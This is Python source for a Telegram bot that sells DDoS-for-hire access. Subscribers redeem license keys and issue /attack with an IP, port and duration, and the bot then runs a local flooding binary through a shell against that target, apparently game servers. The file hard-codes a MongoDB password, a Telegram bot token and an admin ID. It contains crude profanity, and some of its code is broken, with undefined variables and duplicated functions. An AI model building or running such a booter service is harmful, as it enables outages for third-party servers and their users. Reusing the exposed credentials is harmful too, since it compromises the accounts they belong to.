import asyncio
import random
import string
import logging
import certifi
from telegram import Update
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from telegram.ext import ContextTypes
from datetime import datetime, timedelta, timezone

current_time = datetime.now().strftime("%H:%M:%S IST")  # Get current time here

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

MONGO_URI = 'mongodb+srv://VIKASH:BadnamBadshah@cluster0.jv9he.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['VIKASH']
users_collection = db['DARK']
redeem_codes_collection = db['redeem_codes0']

TELEGRAM_BOT_TOKEN = '8123098389:AAGRkGA5WDmJPjFtqtH1cT6FKvyWobi1szA'
ADMIN_USER_ID = 7653914445

cooldown_dict = {}
user_attack_history = {}
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*🔸 /start* - Start interacting with the bot.\n"
            "*🔸 /attack* - Trigger an attack operation.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /get_id* - ID LENA HAI LOUDE ?.\n"
        )
    else:
        help_text = (
            "*💡 Available Commands for Admins:*\n\n"
            "*🔸 /start* - Start the bot.\n"
            "🔸 /status - Check your subscription status\n"
            "*🔸 /attack* - Start the attack.\n"
            "*🔸 /get_id* - Get user id.\n"
            "*🔸 /add [user_id]* - Add a user.\n"
            "*🔸 /remove [user_id]* - Remove a user.\n"
            "*🔸 /users* - List all allowed users.\n"
            "*🔸 /gen* - Generate a redeem code.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /delete_code* - Delete a redeem code.\n"
            "*🔸 /list_codes* - List all redeem codes.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
    
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  
    user_name = update.effective_user.first_name  
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚡️𝙋𝙍𝙄𝙉𝘾𝙀⋆𝗗𝗗𝗢𝗦⋆𝗛𝗔𝗖𝗞 ☠️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗛𝗼𝗺𝗲 🪂\n 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: inactive ❌\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱s\n• /attack - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @PRINCE_OP6*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return
    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /a <user_id> <days/minutes>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    time_input = context.args[1] 
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  
        total_seconds = time_value * 86400 
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  
        total_seconds = time_value * 60
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return
    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds) 
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@PRINCE_OP6*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@PRINCE_OP6*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*📝 𝗨𝘀𝗮𝗴𝗲: /attack <target> <port> <time>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /attack 1.1.1.1 80 120\n\n⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:\n• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 180 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 1 𝗺𝗶𝗻𝘂𝘁𝗲𝘀*", parse_mode='Markdown')
        return
    ip, port, duration = args
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return
    cooldown_period = 60
    current_time = datetime.now()
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ MADARCHOD RUK JA {remaining_time}*",
                parse_mode='Markdown'
            )
            return
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
        return
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))
    await context.bot.send_message(
    chat_id=chat_id,
    text=(
        f"*🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!*\n"
        f"*🎯 Target Locked: {ip}:{port}*\n"
        f"*⏳ Countdown: {duration} seconds*\n"
        f"*🔥chudai chalu h feedback bhej dena @PRINCE_OP6💥*"
    ),
    parse_mode='Markdown'
)
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
async def papa_bol(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
    message = f"MADARCHOD KA ID HAI: `{user_id}`" 
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./SOULCRACK {target_ip} {target_port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅\n😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @PRINCE_OP6!*", parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return
    max_uses = 1
    custom_code = None
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return
    if time_input[-1].lower() == 'd':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day"
    elif time_input[-1].lower() == 'm':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute"
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [], 
        "max_uses": max_uses,
        "redeem_count": 0
    })
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )
async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*💎 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗠𝗣𝗧𝗜𝗢𝗡\n━━━━━━━━━━━━━━━\n 📝 𝗨𝘀𝗮𝗴𝗲: /redeem @PRINCE_OP6\n\n⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁 𝗡𝗼𝘁𝗲𝘀:\n• 𝗞𝗲𝘆𝘀 𝗮𝗿𝗲 𝗰𝗮𝘀𝗲-𝘀𝗲𝗻𝘀𝗶𝘁𝗶𝘃𝗲\n• 𝗢𝗻𝗲-𝘁𝗶𝗺𝗲 𝘂𝘀𝗲 𝗼𝗻𝗹𝘆\n• 𝗡𝗼𝗻-𝘁𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗮𝗯𝗹𝗲\n\n🔑 𝗘𝘅𝗮𝗺𝗽𝗹𝗲:/redeem @PRINCE_OP6\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n━━━━━━━━━━━━━━━*", parse_mode='Markdown')
        return
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to delete redeem codes!*", 
            parse_mode='Markdown'
        )
        return
    if len(context.args) > 0:
        specific_code = context.args[0]
        result = redeem_codes_collection.delete_one({"code": specific_code})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*⚠️ Code `{specific_code}` not found.*", 
                parse_mode='Markdown'
            )
    else:
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ No expired codes found to delete.*", 
                parse_mode='Markdown'
            )

async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
        return
    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        time_diff = expiry_date - current_time
        remaining_minutes = time_diff.total_seconds() // 60  
        remaining_minutes = max(1, remaining_minutes)  
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440  
            remaining_hours = (remaining_minutes % 1440) // 60  
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        if expiry_date > current_time:
            status = "✅"
        else:
            status = "❌"
            remaining_time = "(Expired)" 
        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
    
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()    
    user_list_message = "👥 User List:\n" 
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = -0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False      
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False
    
def get_status(active_inactive,):
    # Get the current time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")

    # Create the status message with dynamic subscription status
    server_status = "🟢 SERVERS AVAILABLE"  # Automatically set server status to AVAILABLE
    status_message = (
        "⚡️ 𝙋𝙍𝙄𝙉𝘾𝙀⋆𝗗𝗗𝗢𝗦⋆𝗦𝗧𝗔𝗧𝗨𝗦 ⚡️\n"
        "━━━━━━━━━━━━━━━\n"
        f"👤 𝗨𝘀𝗲𝗿's💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻:\n"
        f"• Status: ❌ {active_inactive}\n"
        "• Expires: No active subscription\n\n"
        "🖥️ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
        f"• Status: {server_status}\n"  # Use the server status variable
        "• Ready for attacks\n\n"
        "⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
        "• Status: 🟢 Ready\n"
        "• Duration: 5 minutes per attack\n\n"
        "⏰ 𝗟𝗮𝘀𝘁 𝗨𝗽𝗱𝗮𝘁𝗲𝗱:\n"
        f"• {current_time}\n"  # Insert current time here
        "━━━━━━━━━━━━━━━"
    )

    return status_message

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
  #  application.add_handler(CommandHandler("status", get_status))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("get_id", papa_bol))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("help", help_command))
    
    application.run_polling()
    logger.info("Bot is running.")

if __name__ == '__main__':
    main()
